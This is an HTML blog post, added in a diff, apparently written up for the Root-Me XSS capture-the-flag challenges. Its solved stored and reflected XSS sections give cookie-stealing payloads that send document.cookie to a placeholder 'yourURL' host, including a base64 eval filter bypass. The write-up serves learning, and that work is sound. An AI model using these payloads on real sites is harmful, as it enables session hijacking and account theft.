@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta property="og:title" content="XSS ROOTME">
+    
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2018-12-04">
+    
+    <meta property="og:description" content="">
+    <meta property="og:url" content="https://saddean.github.io/blogs/post/xss-rootme/">
+    <meta property="og:site_name" content="S4D&#39;s Blog">
+    
+    <meta property="og:tags" content="XSS">
+    
+    <meta property="og:tags" content="Rootme">
+    
+    <meta name="generator" content="Hugo 0.52" />
+    <title>XSS ROOTME &middot; S4D&#39;s Blog</title>
+    
+    <link rel="stylesheet" href="https://saddean.github.io/blogs/css/monokai-sublime.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="https://saddean.github.io/blogs/css/style.css">
+    <link rel="stylesheet" type="text/css" href="https://csshake.surge.sh/csshake.min.css">
+    
+    <link href="https://saddean.github.io/blogs/index.xml" rel="alternate" type="application/rss+xml" title="S4D&#39;s Blog" />
+    
+    
+    <link rel="icon" href="https://saddean.github.io/blogs/icon.ico" />
+    
+
+    
+    
+</head>
+
+<body>
+<nav class="navbar navbar-default navbar-fixed-top visible-xs">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+				<a class="navbar-brand" href="https://saddean.github.io/blogs/">$4D</a>
+			
+		</div>
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				
+				
+					<li><a href="https://saddean.github.io/blogs/about">About</a></li>
+				
+					<li><a href="https://saddean.github.io/blogs/">Blog</a></li>
+				
+					<li><a href="https://saddean.github.io/blogs/tags/">Category</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</nav>
+<div class="container-fluid">
+	<div class="row">
+		<div id="menu" class="hidden-xs col-sm-4 col-md-3">
+	<div id="menu-content" class="vertical-align">
+		
+			<h2 class="text-center"><a href="https://saddean.github.io/blogs/">$4D</a></h2>
+		
+		
+		
+			<small class="text-center center-block">🚀 Người đi ra ngoài vũ trụ 🚀</small>
+		
+		
+		
+			<img id="profile-pic" src="https://saddean.github.io/blogs//img/profile.jpg" alt="My Picture" class="img-circle center-block">
+		
+		<div id="social" class="text-center">
+			
+				<a href="https://github.com/saddean"><i class="fa fa-github fa-2x"></i></a>
+			
+				<a href="https://twitter.com/ttuongann"><i class="fa fa-twitter fa-2x"></i></a>
+			
+				<a href="https://facebook.com/ttuongann"><i class="fa fa-facebook fa-2x"></i></a>
+			
+
+			<a href="mailto:11a1pro@gmail.com"><i class="fa fa-envelope-o fa-2x"></i></a>
+		</div>
+		<div id="links" class="text-center">
+			
+			
+				<a href="https://saddean.github.io/blogs/about">About</a>
+			
+				<a href="https://saddean.github.io/blogs/">Blog</a>
+			
+				<a href="https://saddean.github.io/blogs/tags/">Category</a>
+			
+		</div>
+	</div>
+</div>
+
+		<div id="content" class="col-xs-12 col-sm-8 col-md-9">
+			<div class="row">
+				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-8">
+
+<main>
+	<header>
+		<h1 class="title-h1">XSS ROOTME</h1>
+	</header>
+
+	<article>
+		
+
+<hr />
+
+<h2 id="list-of-challgenge">LIST OF CHALLGENGE</h2>
+
+<table>
+<thead>
+<tr>
+<th>Challgenge</th>
+<th>Done</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td><a href="#1"><strong>XSS - Stored 1</strong></a></td>
+<td>✅</td>
+</tr>
+
+<tr>
+<td><a href="#2"><strong>XSS - Stored 2</strong></a></td>
+<td>✅</td>
+</tr>
+
+<tr>
+<td><a href="#3"><strong>XSS - Reflected</strong></a></td>
+<td>✅</td>
+</tr>
+
+<tr>
+<td><a href="#4"><strong>XSS - Stored - filter bypass</strong></a></td>
+<td>❌</td>
+</tr>
+
+<tr>
+<td><a href="#5"><strong>XSS - DOM Based</strong></a></td>
+<td>❌</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<p><a name="1"></a></p>
+
+<h2 id="xss-stored-1">XSS - Stored 1</h2>
+
+<h5 id="vulnerablity-input-message">- Vulnerablity : Input Message</h5>
+
+<h5 id="payload">- Payload :</h5>
+
+<pre><code>&lt;img src=0 onerror=document.location='yourURL/'+document.cookie&gt;
+</code></pre>
+
+<h5 id="note-wait-a-minutessssss">- Note : Wait a minutessssss&hellip;.</h5>
+
+<hr />
+
+<p><a name="2"></a></p>
+
+<h2 id="xss-stored-2">XSS - Stored 2</h2>
+
+<h5 id="vulnerablity-cookie">- Vulnerablity :🍪 Cookie</h5>
+
+<h5 id="payload-1">- Payload :</h5>
+
+<p>Pre-Payload : <code>document.write(&quot;&lt;img src='yourURL?c=&quot;+ document.cookie +&quot;' /&gt;&quot;)</code>
+Base64Code pre-payload in:
+<code>&lt;script&gt;&lt;/script&gt;</code> tags</p>
+
+<pre><code>eval(atob('yourBase64code'))
+</code></pre>
+
+<h4 id="note-some-charaters-were-sanitized">- Note : Some charaters were sanitized</h4>
+
+<hr />
+
+<p><a name="3"></a></p>
+
+<h2 id="xss-reflected">XSS - Reflected</h2>
+
+<h5 id="vulnerablity-on-error-page-find-payload-and-report-to-bot-execute-it">- Vulnerablity : On error page , find payload and report to bot execute it:</h5>
+
+<p><code>http://challenge01.root-me.org/web-client/ch26/?p=[payload]</code></p>
+
+<h5 id="payload-hmmm-a-tags-html-event-attributes">- Payload : hmmm, a tags &ndash;&gt; HTML Event Attributes</h5>
+
+<p>Pre-payload:<code>(new Image()).src=&quot;yourURL/?se=&quot;.concat(document.cookie)</code>
+Because in chall fillter <code>+,&lt;,&gt;,...</code> ,so using eval(atob(base64Code)):</p>
+
+<pre><code>' onmouseover='eval(atob(&quot;base64code&quot;)) 
+</code></pre>
+
+<h5 id="note-nothing">- Note : Nothing</h5>
+
+<hr />
+
+<p><a name="4"></a></p>
+
+<h2 id="xss-stored-filter-bypass">XSS - Stored - filter bypass</h2>
+
+<h5 id="vulnerablity">- Vulnerablity :</h5>
+
+<h5 id="payload-2">- Payload :</h5>
+
+<h5 id="note">- Note :</h5>
+
+<hr />
+
+<p><a name="5"></a></p>
+
+<h2 id="xss-dom-based">XSS - DOM Based</h2>
+
+<h5 id="vulnerablity-1">- Vulnerablity :</h5>
+
+<h5 id="payload-3">- Payload :</h5>
+
+<h5 id="note-1">- Note :</h5>
+
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://saddean.github.io/blogs/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "myblog-wqnng8opme" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+  </div>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-130213932-1', 'auto');
+    ga('send', 'pageview');
+    window.baseURL = "https:\/\/saddean.github.io\/blogs\/";
+  </script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script src="https://saddean.github.io/blogs//js/App.js"></script>
+  
+</body>
+</html>
